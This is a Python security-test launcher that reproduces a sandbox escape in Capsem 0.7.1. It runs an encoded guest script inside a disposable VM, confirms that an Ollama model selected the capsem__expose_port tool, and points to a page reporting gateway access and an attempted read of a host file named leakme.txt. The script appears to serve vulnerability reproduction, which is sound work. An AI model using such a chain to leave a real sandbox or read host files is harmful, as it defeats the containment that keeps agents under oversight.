"""Launch the Ollama-driven Capsem 0.7.1 guest gateway reproduction.

Usage: python tests/security/ollama_gateway_escape.py --vm SESSION_ID

Create a disposable VM first with `capsem create --ram 2 --cpu 1`. Open the
printed guest-published URL in a browser. The page reports gateway authority
and its separate host-file attempt; the host launcher never fetches a token or
reads the target file. Delete the disposable VM when finished.
"""

import argparse
import base64
import json
import re
import shlex
import subprocess
from pathlib import Path


def guest_command(source, vm_id):
    encoded = base64.b64encode(source).decode("ascii")
    code = (
        "import base64,sys;source=base64.b64decode(sys.argv[1]);"
        "sys.argv=[sys.argv[0],sys.argv[2]];exec(compile(source,'<guest-repro>','exec'))"
    )
    return " ".join(
        ["python3", "-c", shlex.quote(code), shlex.quote(encoded), shlex.quote(vm_id)]
    )


def find_host_port(value):
    if isinstance(value, dict):
        for key in ("host_port", "port"):
            port = value.get(key)
            if isinstance(port, int) and port > 0:
                return port
        for child in value.values():
            found = find_host_port(child)
            if found:
                return found
    elif isinstance(value, list):
        for child in value:
            found = find_host_port(child)
            if found:
                return found
    elif isinstance(value, str):
        try:
            return find_host_port(json.loads(value))
        except json.JSONDecodeError:
            match = re.search(r"(?:127\.0\.0\.1|localhost):(\d{2,5})", value)
            if match:
                return int(match.group(1))
    return None


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--vm", required=True, help="ID of a disposable, running Capsem VM")
    args = parser.parse_args()
    guest_source = Path(__file__).with_name("ollama_gateway_escape_guest.py").read_bytes()
    result = subprocess.run(
        ["capsem", "exec", "--timeout", "120", args.vm, guest_command(guest_source, args.vm)],
        capture_output=True,
        text=True,
        timeout=140,
        check=False,
    )
    if result.returncode:
        raise SystemExit(f"guest reproduction failed ({result.returncode}): {result.stderr or result.stdout}")
    try:
        report = json.loads(result.stdout.strip())
    except json.JSONDecodeError as error:
        raise SystemExit(f"guest result was not JSON: {result.stdout}") from error
    if report.get("selected_tool") != {"target": "vm", "guest_port": 18080, "host_port": 0}:
        raise SystemExit("Ollama did not choose the required guest exposure action")
    port = find_host_port(report.get("mcp_result"))
    print("Ollama selected capsem__expose_port inside the guest.")
    print("Guest MCP exposure response:", json.dumps(report["mcp_result"], sort_keys=True))
    if port:
        print(f"Open http://127.0.0.1:{port}/ in your browser to inspect the result.")
    else:
        print("Find the allocated host port in the MCP response above and open it in your browser.")
    print("The page reports gateway access and the separate leakme.txt route result.")


if __name__ == "__main__":
    main()
